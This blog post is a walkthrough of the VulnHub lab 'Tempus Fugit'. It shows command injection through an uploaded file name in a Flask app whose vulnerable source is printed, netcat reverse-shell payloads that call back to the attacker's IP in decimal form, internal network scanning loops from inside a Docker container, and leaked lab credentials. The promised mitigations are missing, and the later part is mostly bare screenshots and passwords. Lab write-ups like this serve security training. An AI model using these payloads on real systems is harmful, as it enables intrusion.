---
layout: post
title:  "Tempus Fugit: Vulnhub Walkthrough"
date:   2019-08-02 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [4ndr34z][5] and [DCAU][2]. Its graded as intermediate. As this is purely for educational purposes I'll throw in spoilers now. To exploit this machine we'll need to chain two different exploits, there will be some port forwarding and we'll need to exploit a second machine. At the end we'll also include some mitigation strategies. Without much further ado here we go.

<!--more-->


Using [nmapAutomator][4]. Only port 80 is open:

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-1.png)

Navigating to the home page:
![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-2.png)

We had nikto running in the background but this gave too many false positives we moved on from it.

Using curl to scrape the links on the page. There's only one useful link.
```
kali@marksmith:~/vulnhub/tempus_fugit$ curl -s  192.168.109.142 | grep -Po '(href|src)=".{2,}"'
...
href="/upload"
...
```

The home page has three links, the first three don't have anything promising. We go to `/upload`

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-3.png)

When we try upload the file like `Cherry Notes.ctb.txt`. It throws the error below.

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-4.png)

We tried uploading different file types (.php, .war, .elf) all fail. It only accepts file with extension [.txt] or [.rtf] with no spaces:

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-5.png)


__Conclusion__
1. You can only upload rtf or txt
2. If theres a space files name no execution; you get an error 500
3. If you got other dots than the .[ext] it doesn't work.

Set up burp and start intercepting. In this case the use of Burp is a bit different, when we intercept can only deal with its at the proxy level. Here we go;

After much investigation, the `/upload` function prints the contents of the file, with `.txt or .rtf` that is uploaded. This gives us a hunch that in the background, it could be running a function like `/bin/cat [filename].txt`. So what if we could chain some commands at the end of the `[filename].txt` using `; or | or &&` we get command execution. We can do ls, id, pwd, uname -a. Boom we got RCE.

![5-5a.png](/assets/images/posts/tempus-fugit-walkthrough/20-5b.png)

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-5c.png)

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-5a.png)

Since we got RCE and can list the contents ; we find a file called `main.py`. Reading the code, there’s a part that splits the filename at the fullstops; thus payloads with fullstops are problematic; also payloads with slashes(/) too are problematic. Tried using wget to upload but we’re restricted from executing things in `/upload` directory … i think

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-5d.png)
```
import os
import urllib.request from flask
import Flask, flash, request, redirect, render_template from ftplib
import FTP
import subprocess
UPLOAD_FOLDER = 'upload'
ALLOWED_EXTENSIONS = {
  'txt',
  'rtf'
}
app = Flask(__name__)
app.secret_key = "mofosecret"
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024 @app.route('/', defaults = {
  'path': ''
}) @app.route('/<path:path>') def catch_all(path): cmd = 'fortune -o'
result = subprocess.check_output(cmd, shell = True) return "<h1>400 - Sorry. I didn't find what you where looking for.</h1> <h2>Maybe this will cheer you up:</h2><h3>" + result.decode("utf-8") + "</h3>"
@app.errorhandler(500) def internal_error(error): return "<h1>500?! - What are you trying to do here?!</h1>"
@app.route('/') def home(): return render_template('index.html') @app.route('/upload') def upload_form(): try: return render_template('my-form.html') except Exception as e: return render_template("500.html", error = str(e)) def allowed_file(filename): check = filename.rsplit('.', 1)[1].lower() check = check[: 3] in ALLOWED_EXTENSIONS
return check @app.route('/upload', methods = ['POST']) def upload_file(): if request.method == 'POST': if 'file' not in request.files: flash('No file part') return redirect(request.url) file = request.files['file']
if file.filename == '': flash('No file selected for uploading') return redirect(request.url) if file.filename and allowed_file(file.filename): filename = file.filename file.save(os.path.join(UPLOAD_FOLDER, filename)) cmd = "cat " + UPLOAD_FOLDER + "/" + filename result = subprocess.check_output(cmd, shell = True) flash(result.decode("utf-8")) flash('File successfully uploaded') try: ftp = FTP('ftp.mofo.pwn') ftp.login('someuser', 'b232a4da4c104798be4613ab76d26efda1a04606') with open(UPLOAD_FOLDER + "/" + filename, 'rb') as f: ftp.storlines('STOR %s' % filename, f) ftp.quit() except: flash("Cannot connect to FTP-server") return redirect('/upload')
else :flash('Allowed file types are txt and rtf') return redirect(request.url) if __name__ == "__main__": app.run()
```

Only option for a payload is `/bin/nc`. Also the IP has to be in decimal format Using `nc -e <<ip decimal format>> <<port number>> sh` works. 
Our IP 192.168.109.148 in decimal format is 3232263572 (using any online converter):

We initially tried these.
```
nc -e /bin/sh 3232263572 4242
nc -e /bin/bash 3232263572 4242
nc 3232263572 4242 sh
```
None of them payloads worked;

However, this gives a reverse shell.

```
nc 3232263572 4242 -e sh
```

Once we're inside we realise why the first three options didnt work. The `-e option` must be last;

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-6.png)

When we run LinEnum, it tells us we're in a docker environment, 
```
[+] Looks like we're in a Docker container:
...
-rwxr-xr-x    1 root     root             0 Aug 16  2019 /.dockerenv
```

The machine IP is different from what we have externally as well
```
### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 02:42:AC:13:00:0A
          inet addr:172.19.0.10  Bcast:172.19.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:139629 errors:0 dropped:0 overruns:0 frame:0
          TX packets:135825 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:7799491 (7.4 MiB)  TX bytes:10351266 (9.8 MiB)
...
```

As we did in [wintermute][6] we scan the internal network;

```
for ip in $(seq 1 254); do ping -c 1 172.19.0.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 ; done

172.19.0.1
172.19.0.10
172.19.0.12
172.19.0.100

for p in $(seq 1 65535); do nc -nvzw1 172.19.0.12 $p 2>&1 ; done | grep open
172.19.0.12 (172.19.0.12:21) open

for p in $(seq 1 65535); do nc -nvzw1 172.19.0.100 $p 2>&1 ; done | grep open
172.19.0.100 (172.19.0.100:53) open

for p in $(seq 1 65535); do nc -nvzw1 172.19.0.1 $p 2>&1 ; done | grep open
172.19.0.1 (172.19.0.1:22) open
172.19.0.1 (172.19.0.1:80) open
172.19.0.1 (172.19.0.1:8080) open
```

bash-4.4# cat rl_history
 1565501674
open 172.19.0.12
 1565501679
quit
 1565501725
lftp 172.19.0.12
 1565501727
ls
 1565501758
?
 1565501767
qut
 1565501769
quit
 1565595928
exit
 1584064057
user someruser
 1584064068
id
 1584064071
list
 1584064080
help
 1584064113
ls
 1584064115
exit


b232a4da4c104798be4613ab76d26efda1a04606

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-7.png)

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-8.png)

myD3#2p$a%s&s

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-9.png)

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-10.png)

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-11.png)


![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-12.png)

![5-3.png](/assets/images/posts/tempus-fugit-walkthrough/20-13.png)













hardEnough4u

[1]: https://www.vulnhub.com/entry/billu-b0x-2,238/
[2]: https://twitter.com/@DCAU7
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
[5]: https://twitter.com/@4nqr34z
